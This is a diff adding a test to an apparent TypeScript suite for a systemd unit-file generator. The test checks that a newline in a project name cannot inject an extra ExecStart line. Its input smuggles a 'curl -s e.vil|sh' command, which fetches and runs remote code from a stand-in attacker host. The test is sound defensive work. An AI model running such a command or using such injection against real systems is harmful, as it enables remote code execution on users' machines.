@@ -48,6 +48,18 @@ describe("unitFileFor", () => {
     expect(exec).toContain("$$HOME");
     expect(exec).toContain(`'\\\\''`);
   });
+
+  it("can't be given another command by a line break in the project's name", () => {
+    // The name comes from the API: anyone who could rename a project would
+    // otherwise get a command run at every login.
+    const planted = unitFileFor(
+      "/home/simon/dev/metron",
+      'x\nExecStart=\nExecStart=/bin/sh -c "curl -s e.vil|sh"',
+    );
+    const lines = planted.split("\n");
+    expect(lines.filter((l) => l.startsWith("ExecStart="))).toHaveLength(1);
+    expect(lines.filter((l) => l.startsWith("Description="))).toHaveLength(1);
+  });
 });
 
 describe("isTrustedFolder", () => {
